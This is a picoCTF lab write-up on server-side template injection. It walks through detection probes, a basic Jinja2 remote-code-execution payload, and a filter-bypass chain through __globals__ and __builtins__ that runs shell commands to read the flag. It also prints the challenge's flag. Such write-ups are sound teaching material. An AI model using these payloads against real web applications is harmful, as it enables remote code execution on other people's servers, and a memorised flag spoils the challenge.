# picoCTF Challenge: SSTI Bypass (Jinjasaur)

1. **What is SSTI?**: This challenge introduces Server-Side Template Injection (SSTI). It’s a technique where a malicious payload is injected into a template using native template syntax. Instead of writing a new HTML page for every user, servers use templates like `Hello {{user_name}}!`. If a user logs in as "Christian," the server replaces the placeholder and sends `Hello Christian!` to the browser.
[The Challenge](../ctf/ssti1.png)
2. **Testing for Vulnerability**: You can check if a site is vulnerable by injecting mathematical payloads based on different engines:
   * `${7*7}` - Smarty/FreeMarker (Java/PHP)
   * `{{7*7}}` - Jinja2/Twig (Python/PHP)
   * `<%= 7*7 %>` - ERB (Ruby)
   If I input `{{7*7}}` and the site prints `49` instead of the literal text, the site is vulnerable because it is executing my input as code.

3. **Confirmation**: The challenge description said, “I made a cool website where you can announce whatever you want!” I injected `{{7*7}}` as an announcement, and the site returned `49`. This confirmed the site uses the **Jinja2** (Python) engine.
[The testing](../ctf/ssti2.png)
4. **Attempting Remote Code Execution (RCE)**: I tried to run a command to list files using the simplest Python payload:
   `{{ __import__('os').popen('ls').read() }}`
   * `import os`: Access operating system functions.
   * `popen('ls')`: Run the shell command to list files.
   * `read()`: Capture and display the result.
[Injecting payloads](../ctf/ssti3.png)
5. **Bypassing the Filter**: The initial payload was blocked by a server-side filter. To bypass it, I used a more complex path to reach the same functions:
   `{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}`
   * **request.application**: Accesses the Flask app instance.
   * **__globals__**: Accesses the internal Python scope and variables.
   * **__builtins__**: Accesses all built-in functions, including `__import__`, which the filter was trying to hide.
[The complex payload path](../ctf/ssti4.png)
6. **Final Flag Extraction**: With the bypass working, I executed the command to read the flag file:
   `{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}`
[The flag](../ctf/ssti5.png)

**Final Flag**: `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}`

---

### What I learned:
I learned that SSTI is extremely dangerous because it allows an attacker to move from a simple web input to full Remote Code Execution (RCE). Even when developers use filters to block "obvious" keywords like `__import__`, Python’s object hierarchy often provides alternative paths to reach the same powerful functions.
